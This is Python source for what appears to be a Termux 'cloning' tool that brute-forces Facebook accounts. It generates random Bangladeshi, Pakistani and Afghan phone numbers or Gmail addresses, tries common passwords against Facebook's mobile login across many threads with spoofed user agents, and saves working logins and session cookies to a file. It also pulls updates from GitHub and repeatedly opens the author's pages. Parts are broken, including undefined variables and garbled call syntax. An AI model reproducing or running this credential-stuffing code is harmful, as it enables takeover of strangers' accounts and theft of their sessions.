# Facebook: Bd RANBO. BY MAHDI
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
ma4D1 = open
newpath = r'/sdcard/Andoid/data/termuxd' 
if not os.path.exists(newpath):
    os.makedirs(newpath)
WHITE = '\033[1;93m'
GREEN = '\033[1;91m'
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry tIhere is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100001244871589', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'
Mahdi_Hasan = print    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/ma4D1')
os.system('xdg-open https://facebook.com/bk4human')


logo ="""
\033[1;91m ##     ##    ###    ##     ##  ########  #### 
\033[1;92m ###   ###   ## ##   ##     ##  ##     ##  ##
\033[1;93m #### ####  ##   ##  ##     ##  ##     ##  ##  
\033[1;91m ## ### ## ##     ## #########  ##     ##  ##
\033[1;92m ##     ## ######### ##     ##  ##     ##  ##
\033[1;93m ##     ## ##     ## ##     ##  ##     ##  ##  
\033[1;91m ##     ## ##     ## ##     ##  ########  ####
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;92m➣ \033[1;92mDEVOLPER   :            MAHDI HASAN SHUVO
\033[1;91m➣ \033[1;91mFACEBOOK   :            MAHDI HASAN
\033[1;92m➣ \033[1;92mWHATSAPP   :            01616406924
\033[1;91m➣ \033[1;91mGITHUB     :            MAHDI HASAN SHUVO
\033[1;92m➣ \033[1;92mTOOLS      :            MAHDI MEX [V5.8]
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
"""
loop = 0
oks = []
cps = []


def clear():
    os.system('clear')
    Mahdi_Hasan(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    Mahdi_Hasan('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 8.0
    update = ('8.0')
    update = ('8.0')
    if str(v) in update:
        os.system('clear')
    else:pass
except:Mahdi_Hasan('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        Mahdi_Hasan('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=['Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF']
mahdiugent=['Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)']
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    mahdiugent.append(uaku2)
 #####main####
# APK CHECK EMIL# APK CHECK EMIL# APK CHECK EMIL# APK CHECK EMIL

def mahdistr():
    os.system('clear')
    os.system('xdg-open https://facebook.com/ma4D1')
    Mahdi_Hasan(logo)
    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    Mahdi_Hasan ('\033[2;93m[1]  Clone From RANDOM BD     \033[1;36m[V2]')
    Mahdi_Hasan ('\x1b[2;91m[2]  Clone From GMAIL         \033[1;32m[V2]')
    Mahdi_Hasan ('\x1b[2;96m[3]  Clone From RANDOM PK     \033[1;36m[V2]')
    Mahdi_Hasan ('\033[2;93m[4]  Clone 8-12 ID            \033[1;36m[V2]')
    Mahdi_Hasan ('\033[2;96m[5]  RANDOM ID MIX with pass  \033[1;36m[V2]')
    Mahdi_Hasan ('\033[2;91m[6]  Clone From User Name     \033[1;36m[V2]')
    Mahdi_Hasan ('\x1b[2;96m[7]  Clone From AFGANISTAN    \033[1;36m[V2]')
    Mahdi_Hasan('[F]  \x1b[2;92mFile cloning             \033[1;36m[V2]')
    Mahdi_Hasan ('\x1b[2;99m[8]  Contact Me')
    Mahdi_Hasan ('\x1b[1;95m[9]  Update Tools')
    Mahdi_Hasan ('\x1b[1;96m[0]  EXIT\033[1;32m')
    Mahdi_Hasan ('\x1b[1;92m------------------------------')
    action()
    print (50 * '-')
    action()
def action():
    global cpb
    global oks
    os.system('xdg-open https://facebook.com/ma4D1')
    shuvo = input('\nINPUT===>   ')
    if shuvo in['']:
        print()
        mahdistr()
    elif shuvo in['f','F','10']:
        file()
    elif shuvo == '1':
        os.system('clear')
        mahdi_bd()
    elif shuvo == '2':
        os.system('clear')
        mahdi_email()
    elif shuvo == '3':
        os.system('clear')
        mahdi_pk()
    elif shuvo == '4':
        os.system('clear')
        print(logo)
        mahdi_MHS()

    elif shuvo == '5':
        mahdi_rd()
            
    elif shuvo == '6':
        mahdi_userNAME()

    elif shuvo == '7':
        mahdi_afg()            
    elif shuvo == '8':
        os.system('clear')
        os.system('xdg-open https://github.com/Shuvo-BBHH')
        print (logo)
        print('[1] Facebook \n[2] Whatapp')
        mahd = input('Chouse :')
        if mahd =='1':
            os.system("xdg-open https://facebook.com/bk4human")
            mahdistr()
        elif mahd =='2':
            os.system('xdg-open https://wa.me/+8801616406924')
            mahdistr()
    elif shuvo == '9':
        os.system('cd $HOME')
        os.system('rm -rf mahdi-mex')
        os.system('git clone https://github.com/Shuvo-BBHH/mahdi-mex')
        print('\033[1;92m\n TOOL UPDATE SUCCESSFUL :)\n')
        os.system('cd mahdi-mex && python mahdi.py')
        time.sleep(5)
    
# APK CHECK EMIL
def mahdi_email():

    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")
    M= '@gmail.com' 
    AH = '@yahoo.com'
    DI  = '@hotmail.com'
    mgmail = random.choice([M])        
    rk1 = '.'
    rk2 = ''
    code = random.choice([rk1,rk2])            
    # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    fastname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING FAST NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    lasttname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LAST NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        m = random.choice([1,2,3,0,4])
        nmp = ''.join(random.choice(string.digits) for _ in range(m))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for mhs in range(passx):
        pww = input(f"[*] Enter Password {mhs+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=40) as manshera:
        clear()
        tl = str(len(user))
        Mahdi_Hasan('\033[1;97m====================================================')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        Mahdi_Hasan('\033[1;97m====================================================')
        for love in user:
            mahdiuser=fastname+code+lasttname+love
            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you',fastname+'123',lasttname+'123',fastname+lasttname +'123',fastname+lasttname +'1234',fastname+'1234',fastname+'1122']
            uid = mahdiuser+'@gmail.com'
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")

#RANDOM BD     )
 
#_______
def mahdi_pk():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")

    code = input(f' [{xr}■{x}] PUT YOUR SIM CODE : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for mhs in range(passx):
        pww = input(f"[*] Enter Password {mhs+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=40) as manshera:
        clear()
        tl = str(len(user))
        Mahdi_Hasan('\033[1;97m====================================================')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        Mahdi_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'khankhan','khan1122','khan12','khan123','khan123456','i love you','free fire','pakistan']
            uid = code+love
            for Mahdi in HamiiID:
                pwx.append(Mahdi)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")

     
# APK CHECK
def mahdi_bd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")
    M = '016'
    A = '017'
    H = '018'
    D = '019'
    I = '015'
    m4 = '015'
    code = random.choice([M,A,H,D,I])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for mhs in range(passx):
        pww = input(f"[*] Enter Password {mhs+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=30) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:],love,love[2:],love+code,'i love you','Fuck you','bangladesh','thank you','password',love+code[1:],'I LOVE YOU','Password']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")



######################
# APK CHECK
def mahdi_rd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")
    
    code = '10000'
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    HamiiID = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=60) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = ['free fire','i love you','Fuck you','bangladesh','alamin123','thank you','12345678']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
############################################################
######################
# APK CHECK
def mahdi_MHS():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)    
    code = '1000000'
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    MHS = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        MHS.append(pww)
    with ThreadPool(max_workers=60) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = ['123456','1234567','12345678','11112222','123123','123456@','123456789','@1234@','500600','693049']
            uid = code+love
            for Shuvo in MHS:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(mahdiold,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")



def  mahdi_userNAME():
    user=[]
    twf =[]

    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")        
    rk1 = ''
    rk2 = '.'
    code = random.choice([rk1,rk2])            
    # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    fastname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING FAST USER NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    lasttname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LAST USER NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        m = random.choice([1,2,3,0,4])
        nmp = ''.join(random.choice(string.digits) for _ in range(m))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan("")
    passx = int(input('pass limite:'))
    HamiiID =[]
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=60) as manshera:
        clear()
        tl = str(len(user))
        Mahdi_Hasan('\033[1;97m====================================================')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        Mahdi_Hasan('\033[1;97m====================================================')
        for love in user:
            m1= fastname+code+love
            m2 = fastname+code+lasttname+love
            mahdinn = random.choice([m1,m2])
            mahdiuser = mahdinn
            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you',fastname+'123',lasttname+'123',fastname+lasttname +'123',fastname+lasttname +'1234',fastname+'1234',fastname+'1122']
            uid = mahdiuser
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")

def mahdi_afg():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")
    rk1 = '9370'
    rk2 = '9379'
    rk3 = '9378'
    rk4 = '9377'
    rk5 = '9374'
    code = random.choice([rk1,rk2,rk3,rk4,rk5])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:],love,love[2:],love+code,'afghan1234','afghan123','afghanistan','100200','500600','800900']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════") 

####################################################################
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
               'authority': 'm.alpha.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                # 'cookie': 'dbln=%7B%22100001244871589%22%3A%22MqPECFJR%22%2C%22100054212546519%22%3A%22TNU748EX%22%7D; sb=kRPRY45Ldv1SzIjqvuIIwbHP; datr=oxPRY9UBZC_y5Rjyj3mHzLFq; locale=en_GB; m_pixel_ratio=1; wd=1349x625; fr=0kalUh13DK38B6MWw.AWWkvbT7Du-6yFySEfUmolwQMas.Bj6chq.7f.AAA.0.0.Bj6dgK.AWWr6S-aWjc',
                'origin': 'https://m.alpha.facebook.com',
                'referer': 'https://m.alpha.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\n\033[1;93m--------------[MAHDI-OK💥]--------------\n\x1b[2;91mNUMBER/EMAIL👉\033[2;32m:'+uid+'\n\x1b[1;95muid➣\033[2;32m:'+cid+'\033[1;32m\033[33m   pass:\033[2;32m'+ps+'\n\x1b[0;38m[‎‎COOKIE]= \033[1;32m'+coki+'\n')
                cek_apk(session,coki)
                ma4D1('/sdcard/MAHDI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
